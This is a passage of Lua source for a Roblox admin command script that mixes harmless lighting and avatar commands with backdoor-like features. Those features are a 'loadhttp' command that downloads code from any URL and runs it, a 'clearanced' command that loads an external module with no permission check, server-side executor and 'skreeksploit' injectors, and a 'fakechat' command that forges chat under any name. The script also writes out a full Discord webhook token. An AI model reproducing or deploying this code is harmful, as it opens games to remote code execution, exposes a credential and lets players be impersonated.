				light.Color = Color3.fromRGB((args[2]),(args[3]),(args[4]))
				light.Range = 12
				light.Brightness = 3
			end)
		end
	end)
	addCommand("nolight", {'unlight'}, function(args, speaker)
		local players = getPlayers(args[1], speaker)
		for i,v in pairs(players)do
			local pchar=Players[v].Character
			for j,v1 in pairs(pchar.HumanoidRootPart:GetChildren()) do
				if v1:IsA("PointLight") then
					v1:Destroy()
				end
			end
		end
	end)
	local origsettings = {abt = Lighting.Ambient, oabt = Lighting.OutdoorAmbient, brt = Lighting.Brightness, time = Lighting.TimeOfDay, fclr = Lighting.FogColor, fe = Lighting.FogEnd, fs = Lighting.FogStart}
	local Saved = {}
	local function DefaultLighting()
		Lighting.Ambient = Color3.fromRGB(0,0,0)
		Lighting.Brightness = 2
		Lighting.ColorShift_Bottom = Color3.fromRGB(0,0,0)
		Lighting.ColorShift_Top = Color3.fromRGB(0,0,0)
		Lighting.GlobalShadows = true
		Lighting.OutdoorAmbient = Color3.fromRGB(128, 128, 128)
		Lighting.ClockTime = 14
		Lighting.GeographicLatitude = 41.733
		Lighting.TimeOfDay = "14:00:00"
		Lighting.ExposureCompensation = 0
		Lighting.FogColor = Color3.fromRGB(192, 192, 192)
		Lighting.FogEnd = 100000
		Lighting.FogStart = 0
		for _, child in pairs(Lighting:GetChildren()) do
			child:Destroy()
		end
	end
	local function SaveLighting()
		origsettings = {abt = Lighting.Ambient, oabt = Lighting.OutdoorAmbient, brt = Lighting.Brightness, time = Lighting.TimeOfDay, fclr = Lighting.FogColor, fe = Lighting.FogEnd, fs = Lighting.FogStart}
	end
	local function RestoreLighting()
		Lighting.Ambient = origsettings.abt
		Lighting.OutdoorAmbient = origsettings.oabt
		Lighting.Brightness = origsettings.brt
		Lighting.TimeOfDay = origsettings.time
		Lighting.FogColor = origsettings.fclr
		Lighting.FogEnd = origsettings.fe
		Lighting.FogStart = origsettings.fs
	end
	local function RestorePoint()
		Saved = {}
		for i, v in pairs(Workspace:GetDescendants()) do
			v.Archivable = true;
		end
		for i, v in pairs(Workspace:GetChildren()) do
			if not v:IsA("Terrain") and not v:IsA("Camera") then
				if not Players:FindFirstChild(v.Name) then
					table.insert(Saved, v:Clone());
				end
			elseif v:IsA("Terrain") then
				Saved.Terrain = Workspace.Terrain:CopyRegion(game:GetService("Workspace").Terrain.MaxExtents);
			end
		end
		return Saved;
	end
	local function InsertPoint()
		if #Saved == 0 and not Saved.Terrain then
			return false;
		end
		for i, v in pairs(Workspace:GetChildren()) do
			if not v:IsA("Camera") and not v:IsA("Terrain") then
				if not Players:FindFirstChild(v.Name) then
					pcall(function()
						v:Destroy()
					end)
				end
			elseif v:IsA("Terrain") then
				v:Clear()
			end
		end
		for i, v in ipairs(Saved) do
			v:Clone().Parent = workspace;
		end
		Workspace.Terrain:PasteRegion(Saved.Terrain, game:GetService("Workspace").Terrain.MaxExtents.Min, true);
	end
	addCommand("savemap", {'smap'}, function(args, speaker)
		if not FindInTable(Owner, speaker.Name) then return end
		RestorePoint()
	end)
	addCommand("restoremap",{'rmap'}, function(args, speaker)
		if not FindInTable(Owner, speaker.Name) then return end
		InsertPoint()
	end)
	addCommand("restorelighting",{'rlighting'}, function(args, speaker)
		RestoreLighting()
	end)
	addCommand("savelighting",{'slighting'}, function(args, speaker)
		SaveLighting()
	end)
	local nodisco
	addCommand("disco",{},function(args, speaker)
		nodisco = nil
		coroutine.resume(coroutine.create(function()
			repeat
				Lighting.GlobalShadows = true
				Lighting.FogEnd = 200
				Lighting.TimeOfDay = 0
				local r = 255
				local g = 0
				local b = 0
				for i = 0,255,5 do
					if nodisco ~=nil then return end
					r = r - 5
					b = b + 5
					Lighting.Ambient = Color3.fromRGB(r,g,b)
					Lighting.OutdoorAmbient = Color3.fromRGB(r,g,b)
					Lighting.FogColor = Color3.fromRGB(r,g,b)
					wait()
				end
				for i = 0,255,5 do
					if nodisco ~=nil then return end
					g = g + 5
					Lighting.Ambient = Color3.fromRGB(r,g,b)
					Lighting.OutdoorAmbient = Color3.fromRGB(r,g,b)
					Lighting.FogColor = Color3.fromRGB(r,g,b)
					wait()
				end
				for i = 0,255,5 do
					if nodisco ~=nil then return end
					b = b - 5
					Lighting.Ambient = Color3.fromRGB(r,g,b)
					Lighting.OutdoorAmbient = Color3.fromRGB(r,g,b)
					Lighting.FogColor = Color3.fromRGB(r,g,b)
					wait()
				end
				for i = 0,255,5 do
					if nodisco ~=nil then return end
					r = r + 5
					Lighting.Ambient = Color3.fromRGB(r,g,b)
					Lighting.OutdoorAmbient = Color3.fromRGB(r,g,b)
					Lighting.FogColor = Color3.fromRGB(r,g,b)
					wait()
				end
				for i = 0,255,5 do
					if nodisco ~=nil then return end
					g = g - 5
					Lighting.Ambient = Color3.fromRGB(r,g,b)
					Lighting.OutdoorAmbient = Color3.fromRGB(r,g,b)
					Lighting.FogColor = Color3.fromRGB(r,g,b)
					wait()
				end
			until nodisco
		end))
	end)
	addCommand("undisco",{'nodisco'}, function(args, speaker)
		nodisco = true
		RestoreLighting()
	end)
	addCommand("shrek",{},function(args, speaker)
		local players = getPlayers(args[1], speaker)
		for i,v in pairs(players)do
			spawn(function()
				Players[v].CharacterAppearanceId = 1481185722
				wait()
				findCMD("re").FUNC({}, speaker)
			end)
		end
	end)
	addCommand("noob",{},function(args, speaker)
		local players = getPlayers(args[1], speaker)
		for i,v in pairs(players)do
			spawn(function()
				Players[v].CharacterAppearanceId = -1
				wait()
				findCMD("re").FUNC({}, speaker)
			end)
		end
	end)
	addCommand("bacon",{},function(args, speaker)
		local players = getPlayers(args[1], speaker)
		local noobids = {245078111,363954555}
		for i,v in pairs(players)do
			spawn(function()
				Players[v].CharacterAppearanceId = noobids[math.random(1, #noobids)]
				wait()
				findCMD("re").FUNC({}, speaker)
			end)
		end
	end)
	addCommand("guest", {}, function(args, speaker)
		local players = getPlayers(args[1], speaker)
		local guestids = {15437777,15437741,15560089}
		for i,v in pairs(players)do
			spawn(function()
				Players[v].CharacterAppearanceId = guestids[math.random(1, #guestids)]
				wait()
				findCMD("re").FUNC({}, speaker)
			end)
		end
	end)
	addCommand("unchar",{'uncharacter'}, function(args, speaker)
		local players = getPlayers(args[1], speaker)
		for i,v in pairs(players)do
			Players[v].CharacterAppearanceId = 0
			wait()
			findCMD("re").FUNC({}, speaker)
		end
	end)
	addCommand("clear", {'clearws', 'clearworkspace'}, function(args, speaker)
		if not FindInTable(Owner, speaker.Name) then return end
		for _,v in pairs(Workspace:GetChildren()) do
			if not v:IsA("Terrain") and v ~= Workspace.CurrentCamera and not Players:GetPlayerFromCharacter(v) then
				v:Destroy()
			elseif v:IsA("Terrain") then
				v:Clear()
			end
		end
		for i,v in pairs(Workspace.Terrain:GetChildren()) do v:Destroy() end
		local p = Instance.new("Part", Workspace)
		p.Anchored = true
		p.FormFactor = "Symmetric"
		p.Size = Vector3.new(1500,0.5,1500)
		p.Position = Vector3.new(0,0,0)
		p.BrickColor = BrickColor.new("Bright green")
		p.Material = "Grass"
		p.Locked = true
	end)
	addCommand("place", {'game', 'gametp', 'gameteleport'}, function(args, speaker)
		if not FindInTable(Owner,speaker.Name) then return end
		local players = getPlayers(args[1], speaker)
		for i,v in pairs(players)do
			spawn(function()
				game:GetService("TeleportService"):Teleport(args[2], Players[v])
			end)
		end
	end)
	addCommand("item", {'sell'}, function(args, speaker)
		if not FindInTable(Owner,speaker.Name) then return end
		local players = getPlayers(args[1], speaker)
		for i,v in pairs(players)do
			spawn(function()
				MarketplaceService:PromptPurchase(Players[v],args[2])
			end)
		end
	end)
	addCommand("createteam", {'newteam'}, function(args, speaker)
		local NewTeam = Instance.new("Team", game:GetService("Teams"))
		NewTeam.TeamColor = BrickColor.new("Really black")
		NewTeam.Name = getString(1)
	end)
	addCommand("removeteam", {'deleteteam'}, function(args, speaker)
		for i,v in pairs(Teams:GetChildren())do
			local L_name = v.Name:lower()
			local F = L_name:find(getString(1))
			if F == 1 then
				v:Destroy()
			end
		end
	end)
	addCommand("team", {}, function(args, speaker)
		local players = getPlayers(args[1], speaker)
		local teamname = nil
		for i,v in pairs(players)do
			for a,b in pairs(game.Teams:GetChildren()) do
				local L_name = b.Name:lower()
				local F = L_name:find(getString(2))
				if F == 1 then
					teamname = b
				end
			end
			Players[v].Team = teamname
		end
	end)
	addCommand("maxhealth", {}, function(args, speaker)
		local players = getPlayers(args[1], speaker)
		for i,v in pairs(players)do
			spawn(function()
				Players[v].Character:FindFirstChildOfClass('Humanoid').MaxHealth = args[2]
			end)
		end
	end)
	addCommand("health", {'sethealth'}, function(args, speaker)
		local players = getPlayers(args[1], speaker)
		for i,v in pairs(players)do
			spawn(function()
				Players[v].Character:FindFirstChildOfClass('Humanoid').Health = args[2]
			end)
		end
	end)
	addCommand("damage", {'removehealth'}, function(args, speaker)
		local players = getPlayers(args[1], speaker)
		for i,v in pairs(players)do
			spawn(function()
				Players[v].Character:FindFirstChildOfClass('Humanoid'):TakeDamage(args[2])
			end)
		end
	end)
	addCommand("heal", {'addhealth'}, function(args, speaker)
		local players = getPlayers(args[1], speaker)
		for i,v in pairs(players)do
			spawn(function()
				Players[v].Character:FindFirstChildOfClass('Humanoid'):TakeDamage(-args[2])
			end)
		end
	end)
	addCommand("ambient", {}, function(args, speaker)
		Lighting.Ambient = Color3.fromRGB(args[1],args[2],args[3])
		Lighting.OutdoorAmbient = Color3.fromRGB(args[1],args[2],args[3])
	end)
	addCommand("fogend", {}, function(args, speaker)
		Lighting.FogEnd = args[1]
	end)
	addCommand("fogstart", {}, function(args, speaker)
		Lighting.FogStart = args[1]
	end)
	addCommand("fogcolor", {}, function(args, speaker)
		Lighting.FogColor = Color3.fromRGB(args[1], args[2], args[3])
	end)
	addCommand("blush", {}, function(args, speaker)
		local players = getPlayers(args[1], speaker)
		for i,v in pairs(players)do
			local dec = Instance.new("Decal", Players[v].Character.Head)
			dec.Face = "Front"
			dec.Name = "Blush"
			dec.Texture = "rbxassetid://1290703665"
			dec.Transparency = 0.4
		end
	end)
	addCommand("noblush", {'removeblush'}, function(args, speaker)
		local players = getPlayers(args[1], speaker)
		for i,v in pairs(players)do
			spawn(function()
				for w,k in pairs(Players[v].Character.Head:GetChildren()) do
					if k.Name == "Blush" then
						k:Destroy()
					end
				end
			end)
		end
	end)
	local function Old_YTIY_notify(plr, msg,forever)
		local playergui = plr:WaitForChild'PlayerGui'
		for i,v in pairs(playergui:GetChildren()) do
			if v.Name == "Notification" then
				v:Destroy()
			end
		end
		wait()
		local doit = coroutine.wrap(function()
			local gui = Instance.new('ScreenGui',playergui)
			gui.Name = "Notification"
			local frame = Instance.new('Frame',gui)
			frame.Position = UDim2.new(0,0,0,0)
			frame.Size = UDim2.new(1,0,0.2,0)
			frame.BackgroundTransparency = 1
			local txt = Instance.new('TextLabel',frame)
			txt.TextColor3 = Color3.new(255,255,255)
			txt.TextStrokeColor3 = Color3.new(0, 0, 0)
			txt.TextStrokeTransparency = 0
			txt.BackgroundTransparency = 1
			txt.Text = ""
			txt.Size = UDim2.new(1,0,0.3,0)
			txt.Position = UDim2.new(0,0,0.4,0)
			txt.TextScaled = true
			txt.Font = "Code"
			txt.TextXAlignment = "Center"
			local tap = Instance.new("Sound")
			tap.Parent = gui
			tap.SoundId = "rbxassetid://147982968"
			local str = msg
			local len = string.len(str)
			for i=1,len do
				txt.Text = string.sub(str,1,i)
				local pitche = math.random(20, 40)/10
				tap.PlaybackSpeed = pitche
				tap:Play()
				wait(0.01)
			end
			if forever == false then
				wait(1)
				while txt.TextTransparency < 1 do
					txt.TextTransparency = txt.TextTransparency + 0.1
					txt.TextStrokeTransparency = txt.TextStrokeTransparency + 0.1
					wait(0.001)
				end
				gui:Destroy()
			end
		end)
		doit()
	end
	addCommand("notify", {'n'}, function(args, speaker)
		local players = getPlayers(args[1], speaker)
		for i,v in pairs(players) do
			if args[2] then
				Old_YTIY_notify(Players[v], getString(2), false)
			else
				Old_YTIY_notify(Players[v], "( Blank Message )", false)
			end
		end
	end)
	local function insertModel(ID, speaker)
		local assetId = ID
		local success, model = pcall(function()
			return(InsertService:LoadAsset(assetId))
		end)
		if not success then
			Old_YTIY_notify(speaker, "Request ID failed.", false)
		end
	end
	addCommand("insert", {}, function(args, speaker)
		if not FindInTable(Owner, speaker.Name) then return end
		insertModel(args[1], speaker)
	end)
	-- REQUEST START
	local function RequestCommand(player, cmd, reason)
		if cmd == nil then return end
		local success, data = pcall(function()
			local dataEncoded = HttpService:JSONEncode({
				content = "plz add ("..tostring(cmd)..") requested by ("..player.Name..") reason: ("..reason..")";
			})
			HttpPost("https://discord.com/api/webhooks/1086457618245095446/D-E5WiUntkjOJSgkN1H3WJW4qypDTtCFVD7geqCFEds9Y0X--ynUwNd4j_R8ybK2O4bN", dataEncoded)
		end)
		if success then
			SendToClient:FireClient(player, "notify2", "Sent Successfully!")
		else
			SendToClient:FireClient(player, "notify2", "Failed to send request.")
		end
	end
	addCommand("requestcmd", {}, function(args, speaker)
		if args[1] then
			local res = args[2]
			if res then
				res = getString(2)
			else
				res = "bECAUSE YES. (admin 999666)"
			end
			RequestCommand(speaker, args[1], res)
		end
	end)
	-- REQUEST END
	addCommand("explorer", {}, function(args, speaker)
		local players = getPlayers(args[1], speaker)
		for i,v in pairs(players)do
			local GUI = GUIs["Explorer (CLIENT)"]:Clone()
			GUI.Explorer.LocalScript.Disabled = false
			GUI.Parent = Players[v]:FindFirstChildWhichIsA("PlayerGui")
		end
	end)
	addCommand("f3x", {"btools"}, function(args, speaker)
		local players = getPlayers(args[1], speaker)
		for i,v in pairs(players)do
			local GEAR = Tools.BuildingTools:Clone()
			GEAR.Parent = Players[v]:FindFirstChildWhichIsA("Backpack")
		end
	end)
	addCommand("slaptool", {}, function(args, speaker)
		local players = getPlayers(args[1], speaker)
		for i,v in pairs(players)do
			local GEAR = Tools.Slap:Clone()
			GEAR.Parent = Players[v]:FindFirstChildWhichIsA("Backpack")
		end
	end)
	addCommand("speed", {'walkspeed'}, function(args, speaker)
		local players = getPlayers(args[1], speaker)
		for i,v in pairs(players) do
			spawn(function()
				if args[2] then
					Players[v].Character:FindFirstChildOfClass('Humanoid').WalkSpeed = args[2]
				else
					speaker.Character:FindFirstChildOfClass('Humanoid').WalkSpeed = args[1]
				end
			end)
		end
	end)
	addCommand("jumppower", {}, function(args, speaker)
		local players = getPlayers(args[1], speaker)
		for i,v in pairs(players) do
			spawn(function()
				if args[2] then
					Players[v].Character:FindFirstChildOfClass('Humanoid').JumpPower = args[2]
				else
					speaker.Character:FindFirstChildOfClass('Humanoid').JumpPower = args[1]
				end
			end)
		end
	end)
	addCommand("skreeksploit", {}, function(args, speaker)
		local players = getPlayers(args[1], speaker)
		for i,v in pairs(players) do
			spawn(function()
				Rig6(speaker)
				local SKREEKSPLOIT_SCR = Scripts.SkreekSploit:Clone()
				SKREEKSPLOIT_SCR.Name = Players[v].Name
				SKREEKSPLOIT_SCR.Parent = Players[v].Character
				SKREEKSPLOIT_SCR.Disabled = false
				SKREEKSPLOIT_SCR.LocalScript.Disabled = false
			end)
		end
	end)
	addCommand("serversideexecutor", {'ssexecutor'}, function(args, speaker)
		if not FindInTable(Owner,speaker.Name) then return end
		local players = getPlayers(args[1], speaker)
		for i,v in pairs(players) do
			spawn(function()
				local gui = GUIs.D:Clone()
				gui.Parent = Players[v]:FindFirstChildWhichIsA("PlayerGui")
				gui.Main.Disabled = false
			end)
		end
	end)
	addCommand("version", {}, function(args, speaker)
		SendToClient:FireClient(speaker, "Notify", "Current version is "..tostring(GLOBAL_VERSION))
	end)
	addCommand("freeadmin", {}, function(args, speaker)
		if not FindInTable(Owner, speaker.Name) then return end
		FreeAdmin = true
		for i,v in pairs(Players:GetPlayers()) do
			if not FindInTable(Owner, v.Name) or not FindInTable(Admin, v.Name) then
				table.insert(Admin, v.Name)
				GiveHandler(v)
			end
		end
	end)
	-- z
	addCommand("console", {}, function(args, speaker)
		local players = getPlayers(args[1], speaker)
		for i,v in pairs(players)do
			spawn(function()
				local gui = Scripts.OpenConsole:Clone()
				gui.Parent = Players[v]:FindFirstChildWhichIsA("PlayerGui")
				gui.Disabled = false
			end)
		end
	end)
	addCommand("rejoin", {}, function(args, speaker)
		if not args[1] then
			TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, speaker)
			return
		end
		local players = getPlayers(args[1], speaker)
		for i,v in pairs(players)do
			spawn(function()
				TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, Players[v])
			end)
		end
	end)
	addCommand("split", {}, function(args, speaker)
		local players = getPlayers(args[1], speaker)
		for i,v in pairs(players)do
			spawn(function()
				if Players[v].Character:FindFirstChild('Torso') then
					Players[v].Character.Archivable = true
					local Char = Players[v].Character:Clone()
					Players[v].Character.Archivable = false
					Char.Parent = Players[v].Character
					Char:MakeJoints()
					Char:MoveTo(Players[v].Character.HumanoidRootPart.Position + Vector3.new(0,3,1))
					Char['Left Leg']:Destroy()
					Char['Right Leg']:Destroy()
					local cloneV = Instance.new("BoolValue")
					cloneV.Name = "isclone"
					cloneV.Parent = Char
					Players[v].Character.Torso.Transparency = 1
					Players[v].Character.Head.Transparency = 1
					Players[v].Character.Head.face.Transparency = 1
					Players[v].Character['Right Arm'].Transparency = 1
					Players[v].Character['Left Arm'].Transparency = 1
					for i,v in pairs(Players[v].Character.Humanoid:GetAccessories())do
						v:Destroy()
					end
				else
					Players[v].Character.UpperTorso.Waist:Destroy()
				end
			end)
		end
	end)
	addCommand("clearcharappearance", {'clearcharacterappearance'}, function(args, speaker)
		local players = getPlayers(args[1], speaker)
		for i,v in pairs(players)do
			spawn(function()
				Players[v]:ClearCharacterAppearance()
			end)
		end
	end)
	addCommand("naked", {"removeclothes"}, function(args, speaker)
		local players = getPlayers(args[1], speaker)
		for i,v in pairs(players)do
			spawn(function()
				if Players[v].Character then
					for i,c in pairs(Players[v].Character:GetChildren()) do
						if c:IsA("Clothing") then
							c:Destroy()
						elseif c:IsA("WrapLayer") then
							c.Parent.Parent:Destroy()
						end
					end
				end
			end)
		end
	end)
	local chatter do
		local CHAT_COLORS = {
			Color3.new(253/255,41/255,67/255),
			Color3.new(1/255,162/255,255/255),
			Color3.new(2/255,184/255,87/255),
			BrickColor.new("Bright violet").Color,
			BrickColor.new("Bright orange").Color,
			BrickColor.new("Bright yellow").Color,
			BrickColor.new("Light reddish violet").Color,
			BrickColor.new("Brick yellow").Color
		}

		local function GetNameValue(pName)
			local value = 0
			for index = 1,#pName do
				local cValue = string.byte(string.sub(pName,index,index))
				local reverseIndex = #pName - index + 1
				if #pName%2 == 1 then
					reverseIndex = reverseIndex - 1
				end
				if reverseIndex%4 >= 2 then
					cValue = - cValue
				end
				value = value + cValue
			end
			return value
		end

		local function nameValue(pName)
			return CHAT_COLORS[(GetNameValue(pName) % #CHAT_COLORS) + 1]
		end

		local cryer = function(name,msg)	
			local id = 123456

			local plr = game:GetService("Players"):FindFirstChild(name)

			pcall(function()
				id = game:GetService("Players"):GetUserIdFromNameAsync(name)
			end)

			local data = {
				ID = math.random(),
				FromSpeaker = name,
				SpeakerUserId = id,
				OriginalChannel = "All",
				IsFiltered = true,
				MessageLength = string.len(msg),
				Message = msg,
				MessageType = "Message",
				Time = os.time(),
				ExtraData = {NameColor = nameValue(name)}
			}

			if plr and plr:IsA("Player") and plr.Team then
				data.ExtraData.NameColor = plr.Team.TeamColor.Color
			end

			local remote = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.OnMessageDoneFiltering:FireAllClients(data,"All")
		end

		chatter = cryer
	end
	addCommand("chat", {}, function(args, speaker)
		local players = getPlayers(args[1], speaker)
		for i,v in pairs(players) do
			spawn(function()
				if args[2] then
					chatter(Players[v].DisplayName, getString(2))
				else
					chatter(Players[v].DisplayName, "[ Content Deleted ]")
				end
			end)
		end
	end)
	addCommand("fakechat", {}, function(args, speaker)
		spawn(function()
			local name = args[1] or "[ Content Deleted "..speaker.UserId.." ]"
			local msg = args[2]
			if msg == nil then
				msg = "[ Content Deleted ]"
			else
				msg = getString(2)
			end
			chatter(name, msg)
		end)
	end)
	addCommand("joinplayer", {'joinp'}, function(args, speaker)
		local Attempts = 0
		local function ToServer(user, place)
			if args[2] == nil then place = game.PlaceId end
			if not pcall(function()
					local FoundUser, UserId = pcall(function()
						if tonumber(user) then
							return tonumber(user)
						end
						return Players:GetUserIdFromNameAsync(user)
					end)
					if not FoundUser then
						SendToClient:FireClient(speaker, 'Notify', 'User does not exist!')
					else
						local URL2 = ("https://games.roproxy.com/v1/games/"..place.."/servers/Public?sortOrder=Asc&limit=100")
						local Http = HttpService:JSONDecode(HttpGet(URL2))
						local GUID
						local function tablelength(T)
							local count = 0
							for _ in pairs(T) do count = count + 1 end
							return count
						end
						for i=1,tonumber(tablelength(Http.data)) do
							for j,k in pairs(Http.data[i].playerIds) do
								if k == UserId then
									GUID = Http.data[i].id
								end
							end
						end
						if GUID ~= nil then
							SendToClient:FireClient(speaker, 'Notify', 'Joining user..')
							TeleportService:TeleportToPlaceInstance(place,GUID,speaker)
						end
					end
				end)
			then
				if Attempts < 3 then
					Attempts = Attempts + 1
					ToServer(user,place)
				end
			end
		end
		ToServer(args[1],args[2])
	end)
	addCommand("hardkick", {}, function(args, speaker)
		if not FindInTable(Owner, speaker.Name) then return end
		local players = getPlayers(args[1], speaker)
		for i,v in pairs(players)do
			Players[v]:Kick('\n\n[Reqeusted Kick]\n\n')
		end
	end)
	addCommand("serverhop", {}, function(args, speaker)
		spawn(function()
			local JobId = game.JobId
			local servers = {}
			local url = string.format("https://games.roproxy.com/v1/games/%d/servers/Public?sortOrder=Desc&limit=100", tostring(game.PlaceId))
			local body = HttpService:JSONDecode(url)
			if body and body.data then
				for i, v in next, body.data do
					if type(v) == "table" and tonumber(v.playing) and tonumber(v.maxPlayers) and v.playing < v.maxPlayers and v.id ~= JobId then
						table.insert(servers, 1, v.id)
					end
				end
			end
			if #servers > 0 then
				TeleportService:TeleportToPlaceInstance(game.PlaceId, servers[math.random(1, #servers)], Players.LocalPlayer)
			else
				SendToClient:FireClient(speaker, 'Notify', 'Could not find another server')
			end
		end)
	end)
	addCommand("name", {}, function(args, speaker)
		local players = getPlayers(args[1], speaker)
		for i,v in pairs(players)do
			if Players[v].Character then
				local hum = Players[v].Character:FindFirstChildWhichIsA("Humanoid")
				if hum then
					if args[2] then
						hum.DisplayName = getString(2)
					else
						hum.DisplayName = "roblox_user_".. Players[v].UserId
					end
				end
			end
		end
	end)
	addCommand("loadhttp", {}, function(args, speaker)
		if not FindInTable(Owner, speaker.Name) then return end
		local URL = args[1] or "https://users.roproxy.com/v1/users/3523136467"
		local Data = HttpGet(URL, false)
		pcall(require, Modules.Loadstring, Data)
	end)
	addCommand("explode", {}, function(args, speaker)
		local players = getPlayers(args[1], speaker)
		for index, value in pairs(players) do
			spawn(function()
				local char = Players[value].Character
				if char then
					local s = Instance.new("Explosion")
					s.Position = char:FindFirstChild("HumanoidRootPart").Position
					s.Parent = char
				end
			end)
		end
	end)
	addCommand("readmin", {'restartbx'}, function(args, speaker)
		GiveHandler(speaker)
	end)
	addCommand("place", {}, function(args, speaker)
		if not FindInTable(Owner, speaker.Name) then return end
		local s = tonumber(args[2]) or 9792841912
		local GUI = GUIs.RequestedTeleport:Clone()
		local players = getPlayers(args[1], speaker)
		if args[3] == "hidden" then
			GUI.Frame.req.Text = "Requested by ??"
		else
			GUI.Frame.req.Text = "Requested by "..speaker.Name
		end
		for index, value in pairs(players) do
			spawn(function()
				TeleportService:Teleport(s, Players[value], {TeleportedBy = "Bitx32 Admin Script"}, GUI:Clone())
			end)
		end
	end)
	addCommand("clearanced", {}, function(args, speaker)
		require(13305544770)()
	end)
end